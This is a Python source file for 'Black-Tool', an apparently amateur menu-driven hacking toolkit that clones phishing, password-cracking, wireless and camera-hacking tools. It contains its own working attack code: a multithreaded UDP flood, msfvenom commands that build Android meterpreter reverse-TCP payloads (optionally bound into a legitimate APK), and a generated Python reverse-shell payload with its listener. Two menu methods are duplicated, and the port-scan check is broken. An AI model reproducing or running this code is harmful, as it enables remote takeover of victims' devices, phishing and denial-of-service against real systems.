#!/bin/python3
# Black-Tool v5.5.5
# This Tool Made By Sina Meysami
# 

import os,sys,subprocess,time,socket,random,threading
from platform import system
from art import text2art
from colorama import Fore,Back,Style,init

init()

class Black_Tool():
    def main_menu(self): 
        self.clear()
        self.banner()
        self.menu()
    def menu(self):
        print("\n")
        print("{1}.Information Gathering")
        print("{2}.Password Attack")
        print("{3}.Wireless Attack")
        print("{4}.Sniffing & Spoofing")
        print("{5}.Web Attack")
        print("{6}.Malware")
        print("{7}.Dos Attack")
        print("{8}.Cam Hacking")
        print("{0}.About")
        print("{99}.Exit")
        command = str(input(Style.BRIGHT + "\nBlack-Tool# "))
        if (command=="1"):
            self.information_gathering()
        elif (command=="2"):
            self.password_attack()
        elif (command=="3"):
            self.wireless_attack()
        elif (command=="4"):
            self.sniffing_spoofing()
        elif (command=="5"):
            self.web_attack()
        elif (command=="6"):
            self.malware()
        elif (command=="7"):
            self.dos()
        elif (command=="8"):
            self.cam_hacking()
        elif (command=="0"):
            self.about()
        elif (command=="99" or command=="exit" or command=="quit"):
            self.exit_blacktool()
        else:
            print(f"{Fore.RED}\nWrong Key: {command}{Fore.WHITE}")
            time.sleep(0.5)
            try_ = input("Press Enter...")
            self.main_menu()
    def information_gathering(self):
        self.clear()
        self.banner()
        print("\n{1}.Nmap")
        print("{2}.WPScan")
        print("{3}.Setoolkit")
        print("{4}.Web Info")
        print("{5}.CMS Scanner")
        print("{99}.Back")
        command = str(input(Style.BRIGHT + "\nBlack-Tool/Information-Gathering# "))

        if command == "1":
            self.clear()
            print("Installing Nmap")
            nmap_ins = subprocess.getoutput("apt install nmap")
            print(nmap_ins)
            input("Press Enter...")
            self.information_gathering()
        elif command == "2":
            self.clear()
            print("Installing WPScan")
            wpscan_ins = subprocess.getoutput("git clone https://github.com/wpscanteam/wpscan")
            input("Press Enter...")
            self.information_gathering()

        elif command == "3":
            self.clear()
            print("Installing Setoolkit")
            install_set = subprocess.getoutput("git clone https://github.com/trustedsec/social-engineer-toolkit")
            input("Press Enter...")
            self.information_gathering()
        elif command == "4":
            self.clear()
            print("Installing Web Info")
            webinfo_ins = subprocess.getoutput("git clone https://github.com/zahidin/web-information-gathering")
            input("Press Enter...")
            self.information_gathering()
        elif command == "5":
            self.clear()
            print("Installing CMS Scanner")
            cmsscanner_ins = subprocess.getoutput("git clone https://github.com/ajinabraham/CMSScan")
            input("Press Enter...")
            self.information_gathering()
        elif command == "99":
            self.main_menu()
        else:
            print(f"{Fore.RED}\nWrong Key: {command}{Fore.WHITE}")
            time.sleep(0.5)
            try_ = input("Press Enter...")
            self.information_gathering()  
    def password_attack(self):
        self.clear()
        self.banner()
        print("\n{1}.Cupp")
        print("{2}.NCrack")
        print("{99}.Back")
        command = str(input(Style.BRIGHT + "\nBlack-Tool/Password-Attack# "))
        if command == "1":
            self.clear()
            print("Installing Cupp")
            cupp_ins = subprocess.getoutput("git clone https://github.com/Mebus/cupp")
            print("Press Enter...")
            self.password_attack()
        elif command == "2":
            self.clear()
            print("Installing NCrack")
            ncrack_ins = subprocess.getoutput("git clone https://github.com/nmap/ncrack")
            input("Press Enter...")
            self.password_attack()
        elif command == "99":
            self.main_menu()
        else:
            print(f"{Fore.RED}\nWrong Key: {command}{Fore.WHITE}")
            time.sleep(0.5)
            try_ = input("Press Enter...")
            self.password_attack()  
    def wireless_attack(self):
        self.clear()
        self.banner()
        print("\n{1}.Reaver")
        print("{2}.Wifite")
        print("{3}.Airattackit")
        print("{99}.Back")
        command = str(input(Style.BRIGHT + "\nBlack-Tool/Wireless-Attack# "))
        if command == "1":
            self.clear()
            print("Installing Reaver")
            reaver_ins = subprocess.getoutput("git clone https://github.com/t6x/reaver-wps-fork-t6x reaver/")
            input("Press Enter...")
            self.wireless_attack()
        elif command == "2":
            self.clear()
            print("Installing Wifite")
            wifite_ins = subprocess.getoutput("git clone https://github.com/derv82/wifite")
            input("Press Enter...")
            self.wireless_attack()
        elif command == "3":
            self.clear()
            print("Installing Airattackit")
            airattackit_ins = subprocess.getoutput("git clone https://github.com/JoyGhoshs/Airattackit")
            input("Press Enter...")
            self.wireless_attack()
        elif command == "99":
            self.main_menu()
        else:
            print(f"{Fore.RED}\nWrong Key: {command}{Fore.WHITE}")
            time.sleep(0.5)
            try_ = input("Press Enter...")
            self.wireless_attack()  
    def sniffing_spoofing(self):
        self.clear()
        self.banner()
        print("\n{1}.Say Cheese")
        print("{2}.PyPhisher")
        print("{3}.Storm-Breaker")
        print("{4}.Setoolkit")
        print("{99}.Back")
        command = str(input(Style.BRIGHT + "\nBlack-Tool/Sniffing_Spoofing# "))
        if command == "1":
            self.clear()
            print("Installing Say Cheese")
            reaver_ins = subprocess.getoutput("git clone https://github.com/hangetzzu/saycheese")
            input("Press Enter...")
            self.sniffing_spoofing()
        elif command == "2":
            self.clear()
            print("Installing PyPhisher")
            wifite_ins = subprocess.getoutput("git clone https://github.com/KasRoudra2/PyPhisher")
            input("Press Enter...")
            self.sniffing_spoofing()
        elif command == "3":
            self.clear()
            print("Installing Storm-Breaker")
            airattackit_ins = subprocess.getoutput("git clone https://github.com/ultrasecurity/Storm-Breaker")
            input("Press Enter...")
            self.sniffing_spoofing()
        elif command == "4":
            self.clear()
            print("Installing Setoolkit")
            set_ins = subprocess.getoutput("git clone https://github.com/trustedsec/social-engineer-toolkit")
            input("Press Enter...")
            self.sniffing_spoofing()
        elif command == "99":
            self.main_menu()
        else:
            print(f"{Fore.RED}\nWrong Key: {command}{Fore.WHITE}")
            time.sleep(0.5)
            try_ = input("Press Enter...")
            self.sniffing_spoofing()  
    def wireless_attack(self):
        self.clear()
        self.banner()
        print("\n{1}.Reaver")
        print("{2}.Wifite")
        print("{3}.Airattackit")
        print("{99}.Back")
        command = str(input(Style.BRIGHT + "\nBlack-Tool/Wireless-Attack# "))
        if command == "1":
            self.clear()
            print("Installing Reaver")
            reaver_ins = subprocess.getoutput("git clone https://github.com/t6x/reaver-wps-fork-t6x reaver/")
            input("Press Enter...")
            self.wireless_attack()
        elif command == "2":
            self.clear()
            print("Installing Wifite")
            wifite_ins = subprocess.getoutput("git clone https://github.com/derv82/wifite")
            input("Press Enter...")
            self.wireless_attack()
        elif command == "3":
            self.clear()
            print("Installing Airattackit")
            airattackit_ins = subprocess.getoutput("git clone https://github.com/JoyGhoshs/Airattackit")
            input("Press Enter...")
            self.wireless_attack()
        elif command == "99":
            self.main_menu()
        else:
            print(f"{Fore.RED}\nWrong Key: {command}{Fore.WHITE}")
            time.sleep(0.5)
            try_ = input("Press Enter...")
            self.wireless_attack()  
    def sniffing_spoofing(self):
        self.clear()
        self.banner()
        print("\n{1}.Say Cheese")
        print("{2}.PyPhisher")
        print("{3}.Storm-Breaker")
        print("{4}.Setoolkit")
        print("{99}.Back")
        command = str(input(Style.BRIGHT + "\nBlack-Tool/Sniffing_Spoofing# "))
        if command == "1":
            self.clear()
            print("Installing Say Cheese")
            reaver_ins = subprocess.getoutput("git clone https://github.com/hangetzzu/saycheese")
            input("Press Enter...")
            self.sniffing_spoofing()
        elif command == "2":
            self.clear()
            print("Installing PyPhisher")
            wifite_ins = subprocess.getoutput("git clone https://github.com/KasRoudra2/PyPhisher")
            input("Press Enter...")
            self.sniffing_spoofing()
        elif command == "3":
            self.clear()
            print("Installing Storm-Breaker")
            airattackit_ins = subprocess.getoutput("git clone https://github.com/ultrasecurity/Storm-Breaker")
            input("Press Enter...")
            self.sniffing_spoofing()
        elif command == "4":
            self.clear()
            print("Installing Setoolkit")
            set_ins = subprocess.getoutput("git clone https://github.com/trustedsec/social-engineer-toolkit")
            input("Press Enter...")
            self.sniffing_spoofing()
        elif command == "99":
            self.main_menu()
        else:
            print(f"{Fore.RED}\nWrong Key: {command}{Fore.WHITE}")
            time.sleep(0.5)
            try_ = input("Press Enter...")
            self.sniffing_spoofing()  
    def web_attack(self):
        self.clear()
        self.banner()
        print("\n{1}.BruteX")
        print("{2}.SkipFish")
        print("{3}.Blazy")
        print("{4}.PortScanner")
        print("{99}.Back")
        command = str(input(Style.BRIGHT + "\nBlack-Tool/Web-Hacking# "))
        if command == "1":
            self.clear()
            print("Installing BruteX")
            cupp_ins = subprocess.getoutput("git clone https://github.com/1N3/BruteX")
            print("Press Enter...")
            self.web_attack()
        elif command == "2":
            self.clear()
            print("Installing SkipFish")
            ncrack_ins = subprocess.getoutput("git clone https://github.com/spinkham/skipfish")
            input("Press Enter...")
            self.web_attack()
        elif command == "3":
            self.clear()
            print("Installing Blazy")
            ncrack_ins = subprocess.getoutput("git clone https://github.com/s0md3v/Blazy")
            input("Press Enter...")
            self.web_attack()
        elif command == "4":
            self.portscan()
        elif command == "99":
            self.main_menu()
        else:
            print(f"{Fore.RED}\nWrong Key: {command}{Fore.WHITE}")
            time.sleep(0.5)
            try_ = input("Press Enter...")
            self.web_attack()  
    def malware(self):
        self.clear()
        self.banner()
        print("\n{1}.Android")
        print("{2}.Windows")
        print("{99}.Main Menu")
        command = str(input(Style.BRIGHT + "\nBlack-Tool# "))
        if command == "1":
            self.android_mal()
        elif command == "2":
            self.windows_mal()
        elif command == "99":
            self.main_menu()
        else:
            print(f"{Fore.RED}\nWrong Key: {command}{Fore.WHITE}")
            time.sleep(0.5)
            try_ = input("Press Enter...")
            self.malware()  
    def dos(self):
        self.clear()
        self.banner()
        try:
            host = input("\nEnter Host: ")
            ip = socket.gethostbyname(host)
            port = input("Enter Port: ")
            time.sleep(1)
            self.clear()
            print(f"{Fore.GREEN} Ip: {Fore.RED}{ip}{Fore.WHITE}")
            time.sleep(1)
            print(f"\n{Fore.GREEN} Port: {Fore.RED}{port}{Fore.WHITE}")
            time.sleep(2)
            UDP_PORT = port
            bs = random._urandom(1490)
            sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            def run(k):
                while True:
                    sock.sendto(bs,(ip,int(port)))
                    print(f"{Fore.GREEN}Send Packet To {Fore.RED}{ip}{Fore.WHITE}")
            for i in range(10):
                ch = threading.Thread(target=run, args=[i])
                ch.start()
        except KeyboardInterrupt:
            print("Ctrl + C\nDos Stopped!")
            while True:
                try_6 = input("\nTry Dos? [y/n] ")
                if try_6 == "y":
                    self.dos()
                elif try_6 == "n":
                    break
                else:
                    continue
        self.main_menu()

    def cam_hacking(self):
        self.clear()
        self.banner()
        print("\n{1}.Cam Hacker")
        print("{2}.Cam Dumper")
        print("{3}.SEE U")
        print("{4}.Cam Phish")
        print("{99}.Back")
        command = str(input(Style.BRIGHT + "\nBlack-Tool/Camera-Hacking# "))
        if command == "1":
            self.clear()
            print("Installing Cam Hacker")
            reaver_ins = subprocess.getoutput("git clone https://github.com/ANGELSECURITYTEAM/cam-hackers")
            input("Press Enter...")
            self.cam_hacking()
        elif command == "2":
            self.clear()
            print("Installing Cam Dumper")
            wifite_ins = subprocess.getoutput("git clone https://github.com/erfannoori/Cam-Dumper")
            input("Press Enter...")
            self.cam_hacking()
        elif command == "3":
            self.clear()
            print("Installing See U")
            airattackit_ins = subprocess.getoutput("git clone https://github.com/GloveB/Cam-Hack SEE-U/")
            input("Press Enter...")
            self.cam_hacking()
        elif command == "4":
            self.clear()
            print("Installing Cam Phish")
            camphish_ins = subprocess.getoutput("git clone https://github.com/baradatipu/CamPhish")
            input("Press Enter...")
            self.cam_hacking()
        elif command == "99":
            self.main_menu()
        else:
            print(f"{Fore.RED}\nWrong Key: {command}{Fore.WHITE}")
            time.sleep(0.5)
            try_ = input("Press Enter...")
            self.cam_hacking()  
    def portscan(self):
        self.clear()
        self.banner()
        host = input("\nEnter Host: ")
        ip = socket.gethostbyname(host)
        print(f"\n{host} IP: {ip}\n")
        print("\n")
        ports = [21,22,25,80,443]
        for port in ports:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            s.connect_ex((ip,port))
            if (s == 0):
                print(f"{port} Is Open!")
            else:
                print(f"{port} Is Filter!")
            s.close()
        try_ = input("\nTry Again? [y/n] ")
        if try_ == "y":
            self.portscan()
        else:
            print("\nPress Enter...")
            self.main_menu()
    def android_mal(self):
        self.clear()
        self.banner()
        print("\n{1}.Make Payload")
        print("{2}.Start Listener")
        print("{99}.Main Menu")
        command = str(input(Style.BRIGHT + "\nBlack-Tool/Malware/Android# "))
        if command == "1":
            self.android_payload()
        elif command == "2":
            self.android_listener()
        elif command == "99":
            self.main_menu()
        else:
            print(f"{Fore.RED}\nWrong Key: {command}{Fore.WHITE}")
            time.sleep(0.5)
            try_ = input("Press Enter...")
            self.android_mal()  
        
    def android_payload(self):
        self.clear()
        self.banner()
        host = input("\nEnter IP: ")
        port = input("Enter Port: ")
        payload_name = input("Enter Payload Name: ")
        while True:
            bind_q = input("Do You Have A Orginal File? [y/n] ")
            if bind_q == "y":
                orginal_file = input("Enter Orginal File: ")
                make_payload = subprocess.getoutput(f"msfvenom -x {orginal_file} -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} -o {payload_name}.apk")
                print(make_payload)
                break
            elif bind_q == "n":
                make_payload = subprocess.getoutput(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} -o {payload_name}.apk")
                print(make_payload)
                break
            else: continue
        while True:
            try_2 = input("Make Payload Again? [y/n] ")
            if try_2 == "y":
                self.android_payload()
            elif try_2 == "n":
                break
            else:
                continue
        self.main_menu()
    def android_listener(self):
        self.clear()
        self.banner()
        host = input("\nEnter Host: ")
        port = input("Enter Port: ")
        os.system(f"msfconsole -x 'use multi/handler; set LHOST {host}; set LPORT {port}; set PAYLOAD android/meterpreter/reverse_tcp; exploit'")
        while True:
            try_3 = input("Try Listener Again? [y/n] ")
            if try_3 == "y":
                self.android_listener()
                break
            elif try_3 == "n":
                break
            else:
                continue
        self.android_mal()
    def windows_mal(self):
        self.clear()
        self.banner()
        print("\n{1}.Make Payload")
        print("{2}.Start Listener")
        print("{99}.Main Menu")
        command = str(input(Style.BRIGHT + "\nBlack-Tool/Malware/Windows# "))
        if command == "1":
            self.windows_payload()
        elif command == "2":
            self.windows_listener()
        elif command == "99":
            self.main_menu()
        else:
            print(f"{Fore.RED}\nWrong Key: {command}{Fore.WHITE}")
            time.sleep(0.5)
            try_ = input("Press Enter...")
            self.windows_mal() 
    def windows_payload(self):
        self.clear()
        self.banner()
        host = input("\nEnter Host: ")
        port = input("Enter Port: ")
        
        payload_name = input("Enter Payload Name: ")
        payload_code = f"""
from socket import *
from subprocess import getoutput
s = socket(2,1)

s.connect(('{host}',{port}))

print('Connected!')

while True:
    try:
        data = s.recv(123456789).decode()
        result = getoutput(data)
        s.send(result.encode())
    except:
        pass
s.close()

"""
        f = open(f"{payload_name}.py","w")
        f.write(payload_code)
        f.close()
        # exe_out = subprocess.getoutput(f"pyinstaller --onefile {payload_name}.py --noconsole")
        # print(exe_out)
        print(f"\nYour Payload {payload_name} Created!\n")
        while True:
            try_4 = input("Make Payload Again? [y/n] ")
            if try_4 == "y":
                self.windows_payload()
            elif try_4 == "n":
                break
            else:
                continue
        self.windows_mal()

    def windows_listener(self,host="",port=""):
        self.clear()
        self.banner()
        host = input("\nEnter Host: ")
        port = input("Enter Port: ")
        ip = socket.gethostbyname(host)
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((host,int(port)))
        s.listen(2)
        print(f"Start Listener At {ip} Port: {port}")
        c,addr = s.accept()
        print("Client Connect!")
        print("\nEnter Q To Exit!\n")
        while True:    
          command = input(f"{ip}/$ ").encode()
          if command == "q" or command == "Q":
              c.close()
          else:
              c.send(command)
              data = c.recv(123456789).decode()
              print(data)
        c.close()
        while True:
            try_5 = input("Try Listener? [y/n] ")
            if try_5 == "y":
                self.windows_listener()
            elif try_5 == "n":
                break
            else:
                continue
        self.windows_mal()    
    def about(self):
        self.clear()
        sina_art = text2art("Sina Coder","tarty1")
        print(sina_art)
        print(f"\n{Fore.GREEN}This Tool Made by Sina Coder")
        time.sleep(0.5)
        print(f"\nGithub: https://github.com/mrprogrammer2938")
        time.sleep(0.5)
        print(f"\nInstagram: https://instagram.com/sina.coder{Fore.WHITE}")
        time.sleep(0.5)
        time.sleep(2)
        input("Press Enter...")
        self.main_menu()
    def banner(self):
        banner_art = text2art("Black Tool","tarty1")
        print(banner_art)
        print(f"{Fore.RED}Black-Tool 5.5.5    Sina Coder{Fore.WHITE}")
    def clear(self):
        if system() == "Linux" or system() == "Darwin":
            os.system("clear") 
        else:
            os.system("cls")
    def exit_blacktool(self):
        self.clear()
        print(Back.GREEN + Fore.BLACK + "Thanks For Using :)")
        Style.RESET_ALL
        sys.exit()
if __name__ == "__main__":
    
    try:
        BlackTool = Black_Tool()
        BlackTool.main_menu()
    except KeyboardInterrupt:
        print("Ctrl + C")
        print("Exit")
        sys.exit()
